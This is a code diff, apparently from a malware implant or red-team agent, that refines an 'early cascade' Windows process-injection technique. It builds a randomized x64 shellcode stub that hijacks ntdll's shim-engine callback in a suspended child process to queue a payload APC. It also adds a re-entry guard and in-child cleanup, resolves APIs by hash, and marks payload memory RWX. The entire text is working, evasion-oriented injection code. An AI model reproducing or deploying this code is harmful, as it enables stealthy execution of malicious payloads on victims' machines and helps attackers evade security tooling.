@@ -30,6 +30,9 @@
 
 #if INJECTION_TECHNIQUE == INJECT_CASCADE
 
+// In-child shim sanitizer (see definition below) - called from agent_init.
+VOID cascade_sanitize_shims(PINSTANCE inst);
+
 // ntdll export hashes (djb2, key 8527 - matches hash_string_djb2)
 #define H_RtlUnlockMemoryBlockLookaside 0x0e3c8aec   // Win11 anchor
 #define H_RtlQueryDepthSList            0xc070387b   // Win10 anchor
@@ -63,6 +66,13 @@ static UINT64 cas_rand(UINT64* state) {
 
 // Emit the stub into caller storage; returns length. Fillers are unique
 // 64-bit values (the scan below depends on that) and NOP runs vary in length.
+// Filler slots: 0=payload, 1=g_ShimsEnabled, 2=APC ctx, 3=NtQueueApcThread,
+// 4=g_pfnSE_DllLoaded. The stub NULLs the shim callback pointer AFTER
+// queueing the APC - ntdll can re-enable g_ShimsEnabled for later DLL loads
+// (AppCompat processing), and without the NULL every re-invocation queues
+// ANOTHER payload APC. The first instance frees the original allocation
+// (stomp cleanup), so a late second APC executes freed/reused memory
+// (dump-verified: rundll32.exe.11444.dmp, RIP in api-set name strings).
 static SIZE_T cas_build_stub(BYTE* out, UINT64* fillers) {
     UINT64 st = (UINT64)OBF_SALT * 0x2545F4914F6CDD1DULL + 0xC0FFEEULL;
     SIZE_T n = 0;
@@ -72,20 +82,40 @@ static SIZE_T cas_build_stub(BYTE* out, UINT64* fillers) {
     out[n++] = 0x45; out[n++] = 0x33; out[n++] = 0xC9;                  // xor r9d,r9d
     out[n++] = 0x48; out[n++] = 0x21; out[n++] = 0x44; out[n++] = 0x24; out[n++] = 0x20; // and [rsp+0x20],rax
 
-    for (int i = 0; i < 4; i++) {
+    // Pre-draw 5 mutually-unique filler words. Slot 4 is the re-entry guard
+    // flag pointer, emitted before the operand loop.
+    for (int i = 0; i < 5; i++) {
         fillers[i] = cas_rand(&st);
         // distinct fillers - the patch scan matches on these words
-        while (i && (fillers[i] == fillers[0] || fillers[i] == fillers[i-1]))
-            fillers[i] = cas_rand(&st);
+        for (int j = 0; j < i; j++)
+            while (fillers[i] == fillers[j]) fillers[i] = cas_rand(&st);
+    }
 
+    // RE-ENTRY GUARD (filler slot 4 -> pointer to a writable flag byte the
+    // PARENT allocates and zeroes). The stub can be invoked more than once:
+    // ntdll re-enables the shim engine for later DLL loads (AppCompat), which
+    // re-calls g_pfnSE_DllLoaded. The previous guard NULLed g_pfnSE_DllLoaded
+    // from inside the stub, but ntdll .mrdata is READ-ONLY by the time the
+    // stub runs (dump-verified rundll32.exe.4576.dmp: WRITE fault at the A3
+    // store into ntdll+0x1ec108). The parent CAN write .mrdata while the child
+    // is still suspended; the stub cannot afterwards. A writable flag makes any
+    // second invocation a harmless no-op instead of a fault.
+    out[n++] = 0x48; out[n++] = 0xBA;                                   // mov rdx, imm64 (flag ptr)
+    for (int b = 0; b < 8; b++) out[n++] = (BYTE)(fillers[4] >> (b * 8));
+    out[n++] = 0x80; out[n++] = 0x3A; out[n++] = 0x00;                  // cmp byte [rdx], 0
+    SIZE_T jne_at = n;
+    out[n++] = 0x75; out[n++] = 0x00;                                   // jne done (rel8, backpatched)
+    out[n++] = 0xC6; out[n++] = 0x02; out[n++] = 0x01;                  // mov byte [rdx], 1
+
+    for (int i = 0; i < 4; i++) {
         // random 0-4 byte NOP pad before each operand group
         UINT64 pad = cas_rand(&st) & 3;
         for (UINT64 k = 0; k < pad; k++) out[n++] = 0x90;
 
         if (i == 0) { out[n++] = 0x48; out[n++] = 0xBA; }               // mov rdx, imm64
-        else if (i == 1) { out[n++] = 0xA2; }                           // mov ds:[imm64], al
+        else if (i == 1) { out[n++] = 0xA2; }                           // mov ds:[imm64], al (byte: g_ShimsEnabled)
         else if (i == 2) { out[n++] = 0x49; out[n++] = 0xB8; }          // mov r8, imm64
-        else { out[n++] = 0x48; out[n++] = 0xB8; }                      // mov rax, imm64
+        else { out[n++] = 0x48; out[n++] = 0xB8; }                      // mov rax, imm64 (NtQueueApcThread)
 
         for (int b = 0; b < 8; b++) out[n++] = (BYTE)(fillers[i] >> (b * 8));
 
@@ -94,10 +124,14 @@ static SIZE_T cas_build_stub(BYTE* out, UINT64* fillers) {
         }
     }
 
-    out[n++] = 0xFF; out[n++] = 0xD0;                                   // call rax
-    out[n++] = 0x33; out[n++] = 0xC0;                                   // xor eax,eax
+    out[n++] = 0xFF; out[n++] = 0xD0;                                   // call rax (queue APC)
+
+    // no .mrdata store here - see the re-entry guard comment above
+    SIZE_T done_at = n;
     out[n++] = 0x48; out[n++] = 0x83; out[n++] = 0xC4; out[n++] = 0x38;  // add rsp,0x38
     out[n++] = 0xC3;                                                    // ret
+
+    out[jne_at + 1] = (BYTE)(done_at - (jne_at + 2));                   // backpatch jne
     return n;
 }
 
@@ -110,7 +144,6 @@ static BYTE* cas_find_filler(BYTE* stub, SIZE_T len, UINT64 filler) {
     }
     return NULL;
 }
-
 
 // section name compare: 8-byte PE section names, zero padded
 static BOOL cas_sec_name_eq(const BYTE* sec_name, const char* name) {
@@ -269,6 +302,46 @@ static PVOID cas_encode_system_ptr(PVOID pointer) {
     return (PVOID)((v >> n) | (v << (64 - n)));    // _rotr64
 }
 
+// ============================================================================
+// In-child shim-state sanitizer.
+//
+// The cascade stub queues the payload APC during LdrInitializeThunk and then
+// NULLs g_pfnSE_DllLoaded / zeroes g_ShimsEnabled. That is not sufficient:
+// ntdll re-stores the callback (re-encoded) on subsequent shimmed loads, so a
+// SECOND payload APC gets queued after the agent has already freed its
+// original allocation - the child then AVs executing freed/reused memory
+// (dump-verified: rundll32.exe.11444.dmp and rundll32.exe.7636.dmp, RIP =
+// _start+0x20 in a region recycled for api-set name strings).
+//
+// The agent therefore sanitizes the shim state ITSELF at startup, before any
+// free: NULL the callback pointer and zero the enable flag in the current
+// process. Runs under INJECT_CASCADE builds only; harmless when the agent
+// was not cascade-injected (variables just resolve to their normal state).
+// ============================================================================
+VOID cascade_sanitize_shims(PINSTANCE inst) {
+    PVOID ntdll = inst->Modules.Ntdll;
+    if (!ntdll) return;
+    PVOID se_dll_loaded = NULL;
+    PVOID shims_enabled = NULL;
+    if (!cas_resolve_via_shim_engine(ntdll, &se_dll_loaded, &shims_enabled)) {
+        PVOID ref_site = NULL;
+        se_dll_loaded = cas_find_se_dll_loaded(ntdll, &ref_site);
+        if (se_dll_loaded)
+            shims_enabled = cas_find_shims_enabled(ntdll, ref_site);
+    }
+    SIZE_T written = 0;
+    UINT64 zero = 0;
+    BYTE zero_b = 0;
+    if (se_dll_loaded && shims_enabled) {
+        inst->Win32.WriteProcessMemory((HANDLE)-1, se_dll_loaded,
+            &zero, sizeof(zero), &written);
+        inst->Win32.WriteProcessMemory((HANDLE)-1, shims_enabled,
+            &zero_b, sizeof(zero_b), &written);
+        DBG(inst, "[INJECT-CAS] shim state sanitized in-child");
+    }
+}
+
+
 // hInitialThread: the target's initial thread from a SUSPENDED CreateProcess.
 // Cascade ONLY works on a freshly spawned suspended process - the shim
 // callback fires once, during LdrInitializeThunk.
@@ -321,11 +394,20 @@ HANDLE inject_cascade(PINSTANCE inst, HANDLE hProcess, HANDLE hInitialThread,
         DBG(inst, "[INJECT-CAS] payload VirtualAllocEx failed");
         return NULL;
     }
+    // Writable (zero-initialised) page backing the stub's re-entry guard flag.
+    // Must be writable from inside the child at shim-callback time, unlike
+    // ntdll .mrdata which is sealed by then.
+    LPVOID remote_flag = gate_VirtualAllocEx(inst, hProcess, NULL, 0x1000,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!remote_flag) {
+        DBG(inst, "[INJECT-CAS] flag VirtualAllocEx failed");
+        return NULL;
+    }
 
     // Build the stub (per-build random fillers + layout) and patch its
     // operand words by locating the filler values, not by fixed offsets.
     BYTE  stub_buf[CAS_STUB_MAXLEN];
-    UINT64 fillers[4];
+    UINT64 fillers[5];
     SIZE_T stub_len = cas_build_stub(stub_buf, fillers);
 
     PVOID queue_apc = resolve_function(ntdll, H_NtQueueApcThread);
@@ -334,8 +416,13 @@ HANDLE inject_cascade(PINSTANCE inst, HANDLE hProcess, HANDLE hInitialThread,
         return NULL;
     }
     PVOID null_ctx = NULL;
-    PVOID patches[4] = { remote_payload, shims_enabled, null_ctx, queue_apc };
-    for (int pi = 0; pi < 4; pi++) {
+    // Slot 4 is the re-entry guard flag page (see cas_build_stub). The stub no
+    // longer stores into ntdll .mrdata - g_pfnSE_DllLoaded stays pointing at the
+    // stub for the process lifetime, and repeated shim-dispatch calls hit the
+    // guard and return immediately.
+    PVOID patches[5] = { remote_payload, shims_enabled, null_ctx, queue_apc,
+                         remote_flag };
+    for (int pi = 0; pi < 5; pi++) {
         BYTE* slot = cas_find_filler(stub_buf, stub_len, fillers[pi]);
         if (!slot) {
             DBG(inst, "[INJECT-CAS] stub patch site missing");
@@ -358,11 +445,10 @@ HANDLE inject_cascade(PINSTANCE inst, HANDLE hProcess, HANDLE hInitialThread,
     if (step) *step = 23;
     DWORD old_protect = 0;
     gate_VirtualProtectEx(inst, hProcess, remote_stub, stub_len, PAGE_EXECUTE_READ, &old_protect);
-#if defined(INCLUDE_EVASION_SMARTINJECT) && !defined(EVASION_USERWX)
-    gate_VirtualProtectEx(inst, hProcess, remote_payload, sc_len, PAGE_EXECUTE_READ, &old_protect);
-#else
+    // cascade: always RWX — the flat PIC blob self-writes instance data during
+    // init. smartinject's dual-map (RW/RX views) only applies to module-stomp
+    // section mappings, not raw heap allocations.
     gate_VirtualProtectEx(inst, hProcess, remote_payload, sc_len, PAGE_EXECUTE_READWRITE, &old_protect);
-#endif
 
     // enable the shim engine (.data, writable for the process lifetime)
     if (step) *step = 24;
